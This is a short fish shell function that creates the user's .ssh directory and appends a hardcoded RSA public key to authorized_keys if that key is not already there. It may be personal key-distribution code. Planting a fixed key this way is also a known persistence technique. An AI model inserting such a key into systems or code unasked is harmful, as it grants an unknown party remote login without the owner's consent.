function disseminate_all
   set ssh_folder $HOME/.ssh
   set keysfile $HOME/.ssh/authorized_keys

   mkdir $ssh_folder

   if not grep -q "BnhfaNr5onYZ8ZfbRz7BTsnC+Zvcjqjj5" $keysfile
     echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/BnhfaNr5onYZ8ZfbRz7BTsnC+Zvcjqjj5/QaJJUMzFQE+Urb1TXGKuaAG/IYt/pWIld5MGJt0T53w+AP7McrF9ROp1vwLYMKS058fXfOm8bab1DShfOBDNtnF3n/ojLN7CVXGDXgblxbxR+2svhzztldfXlm5kaj4g/UheZHkvOuLNWpyMgHUDxaL/kQXUK2dOqf5sarpFR1qgLpnLAXnbow76kfqJNm0YCkHsnLdpLoRX5RtD8POpEa+5NM7D9rwYby4dEMhMh2V26zJdBUcbGsMoHUjzQBGhvKft0XpGOBQO/e+X/UUq+//aLmVOhIZK1lqybynK+S0gsU/RYL" >> $keysfile
   end
 end
